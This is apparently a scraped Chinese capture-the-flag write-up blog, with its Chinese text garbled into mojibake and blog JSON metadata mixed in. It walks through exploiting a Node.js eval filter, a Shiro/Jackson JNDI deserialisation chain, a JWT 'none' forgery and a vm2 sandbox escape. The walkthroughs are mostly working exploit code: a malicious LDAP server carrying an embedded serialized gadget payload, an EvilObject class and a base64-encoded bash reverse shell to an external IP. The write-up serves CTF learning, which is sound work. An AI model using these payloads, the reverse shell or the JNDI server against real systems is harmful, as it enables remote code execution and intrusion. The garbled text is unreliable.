1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir ld_preloadï¼Œåˆ©ç”¨error_log()è§¦å‘ éªŒè¯ğŸ å‚è€ƒè¿‡å®¢å¸ˆå‚…ï¼š https://guokeya.github.io/post/XxOKeal9U/ nodejs æºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980const express = require('express');const bodyParser = require('body-parser');const cookieSession = require('cookie-session');const fs = require('fs');const crypto = require('crypto');const keys = require('./key.js').keys;function md5(s) &#123; return crypto.createHash('md5') .update(s) .digest('hex');&#125;// æ­£åˆ™åŒ¹é…é™åˆ¶äº†è¡¨è¾¾å¼å½¢å¼function saferEval(str) &#123; if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) &#123; return null; &#125; return eval(str);&#125; // 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ªconst template = fs.readFileSync('./index.html').toString();function render(results) &#123; return template.replace('&#123;&#123;results&#125;&#125;', results.join('&lt;br/&gt;'));&#125;const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123; name: 'PHPSESSION', // 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§ keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post('/', function (req, res) &#123; let result = ''; const results = req.session.results || []; const &#123; e, first, second &#125; = req.body; if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) &#123; if (req.body.e) &#123; try &#123; result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!'; &#125; catch (e) &#123; console.log(e); result = 'Wrong Wrong Wrong!!!'; &#125; results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`); &#125; &#125; else &#123; results.unshift('Not verified!'); &#125; if (results.length &gt; 13) &#123; results.pop(); &#125; req.session.results = results; res.send(render(req.session.results));&#125;);// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPIapp.get('/source', function (req, res) &#123; res.set('Content-Type', 'text/javascript;charset=utf-8'); res.send(fs.readFileSync('./index.js'));&#125;);app.get('/', function (req, res) &#123; res.set('Content-Type', 'text/html;charset=utf-8'); req.session.admin = req.session.admin || 0; res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(80, '0.0.0.0', () =&gt; &#123; console.log('Start listening')&#125;); ç¬¬ä¸€å±‚ç»•è¿‡ 1first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0]) åˆ©ç”¨jså¼±ç±»å‹ï¼Œä¼ first=1&amp;second=[1] [1].lengthå’Œ&quot;1&quot;.lengthéƒ½æ˜¯1 md5([1]+key[0])ï¼Œè¿™é‡Œ+çš„æ—¶å€™[1]ä¼šè½¬æ¢ä¸º&quot;1&quot; ç¬¬äºŒå±‚ 12result = saferEval(req.body.e)results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`); 1str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '') 12ç”¨åœ†æ‹¬å·å°†æ‰€æœ‰é€‰æ‹©é¡¹æ‹¬èµ·æ¥ï¼Œç›¸é‚»çš„é€‰æ‹©é¡¹ä¹‹é—´ç”¨|åˆ†éš”ã€‚ä½†ç”¨åœ†æ‹¬å·ä¼šæœ‰ä¸€ä¸ªå‰¯ä½œç”¨ï¼Œä½¿ç›¸å…³çš„åŒ¹é…ä¼šè¢«ç¼“å­˜ï¼Œæ­¤æ—¶å¯ç”¨?:æ”¾åœ¨ç¬¬ä¸€ä¸ªé€‰é¡¹å‰æ¥æ¶ˆé™¤è¿™ç§å‰¯ä½œç”¨ã€‚å…¶ä¸­ ?: æ˜¯éæ•è·å…ƒä¹‹ä¸€ï¼Œè¿˜æœ‰ä¸¤ä¸ªéæ•è·å…ƒæ˜¯ ?&#x3D; å’Œ ?!ï¼Œè¿™ä¸¤ä¸ªè¿˜æœ‰æ›´å¤šçš„å«ä¹‰ï¼Œå‰è€…ä¸ºæ­£å‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•å¼€å§‹åŒ¹é…åœ†æ‹¬å·å†…çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„ä½ç½®æ¥åŒ¹é…æœç´¢å­—ç¬¦ä¸²ï¼Œåè€…ä¸ºè´Ÿå‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•å¼€å§‹ä¸åŒ¹é…è¯¥æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„ä½ç½®æ¥åŒ¹é…æœç´¢å­—ç¬¦ä¸²ã€‚ ä¸Šé¢çš„æ­£åˆ™å¯ä»¥é€‰æ‹©ä¸‰ç§å½¢å¼ï¼š æ‹¬å·å†…è¡¨ç¤º0æˆ–1æ¬¡ 1ã€Math(.aaaa)å½¢å¼ 2ã€[()+\\-*/&amp;|^%&lt;&gt;=,?:]é‡Œé¢çš„å­—ç¬¦ä¼šè¢«åŒ¹é…ä¸Š 3ã€111(.)111(e111)çš„å½¢å¼ä¼šè¢«åŒ¹é…ä¸Š æˆ‘ç†è§£æ˜¯å› ä¸ºç”¨äº†?:å¯¼è‡´æ•´ä¸ªåŒ¹é…å‡ºç°é—®é¢˜ payloadå¦‚ä¸‹ 1(Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.x&#x3D;Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))()))(Math+1) (Math=&gt;(xxxxx)())(Math+1)è¡¨ç¤ºåŒ¿åå‡½æ•°ï¼Œ å®šä¹‰ä¸€ä¸ªfunctionï¼Œä¼ å…¥å‚æ•°åä¸ºMathï¼Œä¹‹åæ‰§è¡Œxxxxxï¼Œä¼ å…¥çš„å‚æ•°å€¼ä¸ºMath+1 Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(97,108,101,114,116,40,49,41))() åŸå‹é“¾æ±¡æŸ“ï¼Œå…ˆå°†Mathèµ‹å€¼ä¸ºMath.constructorå³Objectï¼Œç„¶åè®¾ç½®Objectçš„construct()æ–¹æ³•ä¸º return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;) ä½†æ˜¯è¿™é‡Œç”±äºé™åˆ¶äº†å­—ç¬¦ï¼Œéœ€è¦è°ƒç”¨fromCharCode()ï¼Œè€Œè¯¥æ–¹æ³•åªèƒ½ç”±stringè°ƒç”¨ï¼Œå› æ­¤å‰é¢ä¼ å…¥Math+1ï¼Œ+è¡¨ç¤ºå­—ç¬¦ä¸²æ‹¼æ¥ä¼šè½¬åŒ–æˆä¸ºstringç±»å‹ï¼Œstring.constructorä¸ºfuncion æœ€åé€šè¿‡eval()æ‰§è¡Œ payload 1&#123;&quot;e&quot;:&quot;(Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.x&#x3D;Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[1]&#125; è¿·çš„è¿˜æ˜¯è¿™ä¸ªæ­£åˆ™ã€‚ã€‚ ezShirohintï¼šgadgetåœ¨POM.xmlå†…ï¼Œjdk&gt;8u191ï¼Œjsonååºåˆ—åŒ– gadgetåº”è¯¥æ˜¯commons-collections3.2.1ï¼Œæ ¹æ®jdk&gt;8u191é™åˆ¶ï¼Œåº”è¯¥æ˜¯å¯ä»¥ä½¿ç”¨CC5 jsonååºåˆ—åŒ–åº”è¯¥æ˜¯fastjsonæˆ–è€…jscksonçš„ååºåˆ—åŒ–æ¼æ´ï¼Œ 12345678&#123; \"@type\" : \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\", \"driverClassLoader\" : &#123; \"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\" &#125;, \"driverClassName\" : \"$$BCEL$$+CC5\"&#125; å°†CC5çš„æ¶æ„å¯¹è±¡è¿›è¡Œ BCELç¼–ç  12345Path path = Paths.get(\"poc.txt\");byte[] data = Files.readAllBytes(path);//BCELç¼–ç String s = Utility.encode(data,true);System.out.print(s); æ‰“äº†ä¸€å‘æ²¡æˆåŠŸ =========================é‡æ–°åšä¸€ä¸‹ å‚è€ƒé“¾æ¥ï¼š moonå¸ˆå‚… è®¿é—®/jsonä¼šè·³åˆ°/login shiroæ¼æ´CVE-2020-1957 ä½¿ç”¨/;/json Shiro æƒé™ç»•è¿‡æ¼æ´åˆ†æï¼ˆCVE-2020-1957ï¼‰ è®¾ç½®äº†POSTè¯·æ±‚æ–¹å¼ï¼Œpostä¼ a=1ï¼Œæç¤ºwas expecting(&#39;true&#39;,&#39;false&#39; or null) postä¼ trueï¼Œå¾—åˆ°jackson interface æŸ¥çœ‹pom.xml æ¯”è¾ƒæ˜æ˜¾çš„æœ‰ch.qos.logbackå’Œcommon-collections è¿™é‡Œjacksonçš„å¯ä»¥åˆ©ç”¨CVE-2019-14439 Jacksonå„ä¸ªgadgetçš„è°ƒç”¨é“¾ JNDI Injection using Getter Based Deserialization Gadgets 1[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap:&#x2F;&#x2F;localhost:43658&#x2F;Calc&quot;&#125;] JNDIæ³¨å…¥ï¼Œå¼€å¯ä¸€ä¸ªldapæœåŠ¡ç»‘å®šæ¶æ„ç±» ä½¿ç”¨marshalsecæ–¹ä¾¿çš„å¯åŠ¨ä¸€ä¸ªLDAP/RMI Ref Server 1mvn clean package -DskipTests ä¸çŸ¥é“é¢˜ç›®ç¯å¢ƒåç«¯æ˜¯æ€ä¹ˆè§£æjsonçš„ï¼Œè‡ªå·±æœ¬åœ°æ­å»ºæµ‹è¯•ä½¿ç”¨ 12345&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.8.3&lt;/version&gt;&lt;/dependency&gt; æµ‹è¯•ç±»Test.java 1234567891011121314151617181920212223import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;public class Test &#123; public static void main(String[] args) throws IOException &#123; StringBuilder d = new StringBuilder(); d.append(\"[\"); d.append(\"\\\"ch.qos.logback.core.db.JNDIConnectionSource\\\"\"); d.append(\",\"); d.append(\"&#123;\"); d.append(\"\\\"jndiLocation\\\"\"); d.append(\":\"); d.append(\"\\\"ldap://0.0.0.0:1389/EvilObject\\\"\"); // payload d.append(\"&#125;\"); d.append(\"]\"); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(); Object obj = objectMapper.readValue(d.toString(), java.lang.Object.class); objectMapper.writeValueAsString(obj); &#125;&#125; æ¶æ„ç±»EvilObject.java 1234567import java.io.IOException;public class EvilObject &#123; public EvilObject() throws IOException &#123; Runtime.getRuntime().exec(\"calc\"); &#125;&#125; å…ˆç¼–è¯‘æˆEvilObject.classï¼Œå†å¼€ä¸ªhttpæœåŠ¡ 1F:\\IdeaProjects\\ctf-shiro\\target\\classes&gt;python -m SimpleHTTPServer 1233 å¯åŠ¨LDAPæœåŠ¡ 1java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;0.0.0.0:1233&#x2F;#EvilObject åœ¨buuä¸Šåšå¼€ä¸ªfrpsï¼Œæœ¬åœ°é…ç½® 1234567891011[common]# server_addr ä¸º FRP æœåŠ¡ç«¯çš„å…¬ç½‘ IPserver_addr &#x3D; node3.buuoj.cn# server_port ä¸º FRP æœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£server_port &#x3D; 26678[windows]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 1389remote_port &#x3D; 1234 payloadæ‰“ä¸€ä¸‹ 1[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ldap:&#x2F;&#x2F;0.0.0.0:1234&#x2F;EvilObject&quot;&#125;] æ²¡æœ‰ååº”ï¼Œå› ä¸ºé«˜ç‰ˆæœ¬JVMå¯¹Reference Factoryè¿œç¨‹åŠ è½½ç±»è¿›è¡Œäº†å®‰å…¨é™åˆ¶ï¼ŒJVMä¸ä¼šä¿¡ä»»LDAPå¯¹è±¡ååºåˆ—åŒ–è¿‡ç¨‹ä¸­åŠ è½½çš„è¿œç¨‹ç±»ã€‚æ­¤æ—¶ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥åˆ©ç”¨å—å®³è€…æœ¬åœ°CLASSPATHä¸­å­˜åœ¨æ¼æ´çš„ååºåˆ—åŒ–Gadgetè¾¾åˆ°ç»•è¿‡é™åˆ¶æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ã€‚ ä¸Šé¢æœ¬åœ°æµ‹è¯•çš„javaç‰ˆæœ¬æ˜¯java1.8.0ï¼Œåˆ‡æ¢æˆ8u202ï¼Œè¿˜æ˜¯èƒ½æ‰§è¡Œï¼Œä¸ç»§ç»­æµ‹è¯•äº†ã€‚ å°è¯•æœ¬åœ°Gadgetï¼Œä¸€å¼€å§‹è‡ªå·±åˆ†æç”¨CC5ï¼Œwpä½¿ç”¨çš„æ˜¯CC8ï¼Œ marshalsecæ— æ³•åˆ©ç”¨åºåˆ—åŒ–å†…å®¹å¼€å¯æœåŠ¡ã€‚ å‚è€ƒkxcode æœ¬åœ°å¼€å¯ä¸€ä¸ªldapæœåŠ¡ï¼Œå…ˆè¯•è¯•CC5ï¼Œä½¿ç”¨ysoserialç”Ÿæˆåºåˆ—åŒ–æ•°æ® 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110package HackerServer.src.main.java;import java.net.*;import java.text.ParseException;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import HackerServer.src.main.java.CodebaseServer;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import com.unboundid.util.Base64;public class HackerLDAPRefServer &#123; private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void lanuchLDAPServer(Integer ldap_port, String http_server, Integer http_port) throws Exception &#123; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), ldap_port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(\"http://\"+http_server+\":\"+http_port+\"/#Exploit\"))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + ldap_port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"foo\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; /** Payload1: Return Reference Factory **/ // e.addAttribute(\"javaCodeBase\", cbstring); // e.addAttribute(\"objectClass\", \"javaNamingReference\"); // e.addAttribute(\"javaFactory\", this.codebase.getRef()); /** Payload1 end **/ /** Payload2: Return Serialized Gadget **/ try &#123; // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64 e.addAttribute(\"javaSerializedData\",Base64.decode(\"rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIACEIABmZvcm1hdEkACmxpbmVOdW1iZXJMAA9jbGFzc0xvYWRlck5hbWVxAH4ABUwADmRlY2xhcmluZ0NsYXNzcQB+AAVMAAhmaWxlTmFtZXEAfgAFTAAKbWV0aG9kTmFtZXEAfgAFTAAKbW9kdWxlTmFtZXEAfgAFTAANbW9kdWxlVmVyc2lvbnEAfgAFeHABAAAAUXQAA2FwcHQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0cHBzcQB+AAsBAAAAM3EAfgANcQB+AA5xAH4AD3EAfgAQcHBzcQB+AAsBAAAAInEAfgANdAAZeXNvc2VyaWFsLkdlbmVyYXRlUGF5bG9hZHQAFEdlbmVyYXRlUGF5bG9hZC5qYXZhdAAEbWFpbnBwc3IAH2phdmEudXRpbC5Db2xsZWN0aW9ucyRFbXB0eUxpc3R6uBe0PKee3gIAAHhweHNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXlxAH4AAUwAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AAXhwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXEAfgAFWwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAvAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AL3NxAH4AKHVxAH4ALAAAAAJwdXEAfgAsAAAAAHQABmludm9rZXVxAH4ALwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ACxzcQB+ACh1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdAAEY2FsY3QABGV4ZWN1cQB+AC8AAAABcQB+ADRzcQB+ACRzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg=\")); &#125; catch (ParseException e1) &#123; e1.printStackTrace(); &#125; /** Payload2 end **/ result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125; public static void main(String[] args) throws Exception &#123; System.out.println(\"HttpServerAddress: \"+\"127.0.0.1\"); System.out.println(\"HttpServerPort: \"+\"1234\"); System.out.println(\"LDAPServerPort: \"+\"1233\"); String http_server_ip = \"127.0.0.1\"; int ldap_port = Integer.valueOf(\"1234\"); int http_server_port = Integer.valueOf(\"1233\"); CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port); lanuchLDAPServer(ldap_port, http_server_ip, http_server_port); &#125;&#125; æˆåŠŸï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦åå¼¹shell ä½¿ç”¨ysoserialç”Ÿæˆpayloadï¼Œä½¿ç”¨bash -i &gt;&amp; /dev/tcp/174.0.194.66/1234 0&gt;&amp;1ä¼šå¤±è´¥ï¼Œ å› ä¸ºRuntime.getRuntime().exec()ä¸­ä¸èƒ½ä½¿ç”¨ç®¡é“ç¬¦ç­‰bashéœ€è¦çš„æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œä¸€æ¬¡ç¼–ç  1bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzQuMC4xOTQuNjYvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 1java -jar ysoserial.jar CommonsCollections5 &#39;curl 174.0.194.66&#39;|base64|xargs echo -nTIzNC5 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzQuMC4xOTQuNjYvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;|base64|xargs echo -n åå¼¹shellæˆåŠŸã€‚ä¹Ÿå¯ä»¥è¯•è¯•wpçš„CC8é‚£æ¡é“¾","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"HFCTF-wp","slug":"HFCTF-wp","date":"2020-04-19T11:21:38.000Z","updated":"2020-04-21T01:55:23.968Z","comments":true,"path":"2020/04/19/HFCTF-wp/","link":"","permalink":"https://glotozz.github.io/2020/04/19/HFCTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• EasyLogin JustEscape BabyUpload EasyLoginæ ¹æ®æç¤º 1234&#x2F;** * æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶ * è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD *&#x2F; å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»åˆ°/app.jsã€/rest.jsã€/controller.jsã€/controllers/api.js è¿™é‡Œçš„sidæ˜¯ç”¨æˆ·å¯ä¿®æ”¹çš„ï¼Œè€Œuserç»è¿‡ä¼šjwtéªŒè¯ï¼Œï¼Œè€Œå½“ç”¨æˆ·ä¼ å…¥jwt secretä¸ºç©ºæ—¶ jsonwebtokenä¼šé‡‡ç”¨algorithm noneè¿›è¡Œè§£å¯† æœ¬æ¥å¯ä»¥ä¼ ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°ç»„ä¸‹æ ‡ï¼Œä½†æ˜¯è¿™é‡Œæœ€åä¸€ä¸ªæ¡ä»¶é™åˆ¶äº†sid&gt;length &amp;&amp; sid&gt;=0ï¼Œåªèƒ½åˆ©ç”¨å¼±ç±»å‹ç»•è¿‡ï¼Œè¿™é‡Œ[]æˆ–è€…&quot;&quot; 1234# pip3.6 install pyjwtimport jwttoken = jwt.encode(&#123;\"secretid\":&#123;&#125;,\"username\":\"admin\",\"password\":\"admin\"&#125;,algorithm=\"none\",key=\"\").decode(encoding='utf-8')print(token) ç™»å½•å¾—åˆ°flag JustEscapeåç«¯æŠ¥é”™ï¼Œå‘ç°æ˜¯nodejsçš„vmï¼Œ é€ƒé€¸ï¼šhttps://github.com/patriksimek/vm2/issues/225 123456789try&#123; Buffer.from(new Proxy(&#123;&#125;, &#123; getOwnPropertyDescriptor()&#123; throw f&#x3D;&gt;f.constructor(&quot;return process&quot;)(); &#125; &#125;)); &#125;catch(e)&#123; e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125; ç”¨æ•°ç»„ç»•è¿‡è¿‡æ»¤code[]= è¿˜å¯ä»¥åˆ©ç”¨jsä¸­[]ä»£æ›¿. æ¯”å¦‚a.b==a[b] åå¼•å·ä»£æ›¿åŒå¼•å·ç­‰ï¼Œ èµµæ€»åˆ©ç”¨æ¨¡æ¿å­—ç¬¦ä¸²åµŒå¥— 1&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96; BabyUpload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384 &lt;?phperror_reporting(0);session_save_path(\"/var/babyctf/\");session_start();require_once \"/flag\";highlight_file(__FILE__);//éœ€è¦æŠŠSESSIONä¸­çš„usernameç½®ä¸ºadminæ‰èƒ½å¾—åˆ°flagif($_SESSION['username'] ==='admin')&#123; $filename='/var/babyctf/success.txt'; if(file_exists($filename))&#123; safe_delete($filename); die($flag); &#125;&#125;else&#123; $_SESSION['username'] ='guest';&#125;//POSTèµ‹å€¼$direction = filter_input(INPUT_POST, 'direction');$attr = filter_input(INPUT_POST, 'attr');//ä¸Šä¼ ç›®å½•æ‹¼æ¥ä¸€å±‚attr$dir_path = \"/var/babyctf/\".$attr;//ä¸Šä¼ è·¯å¾„æ‹¼æ¥ä¸Šsessionä¸­çš„usernameif($attr===\"private\")&#123; $dir_path .= \"/\".$_SESSION['username'];&#125;//ä¸Šä¼ æ–‡ä»¶if($direction === \"upload\")&#123; try&#123; //is_uploaded_file() å‡½æ•°æ£€æŸ¥æŒ‡å®šçš„æ–‡ä»¶æ˜¯å¦æ˜¯é€šè¿‡ HTTP POST ä¸Šä¼  if(!is_uploaded_file($_FILES['up_file']['tmp_name']))&#123; throw new RuntimeException('invalid upload'); &#125; //dir_pathæ‹¼æ¥ä¸Šæ–‡ä»¶å $file_path = $dir_path.\"/\".$_FILES['up_file']['name']; //æ–‡ä»¶åç»§ç»­æ‹¼æ¥ä¸Šä¸€æ®µhashå€¼ $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']); //å¯¹ä¸Šä¼ è·¯å¾„è¿›è¡Œæ­£åˆ™åŒ¹é…è¿‡æ»¤../å’Œ..\\\\ 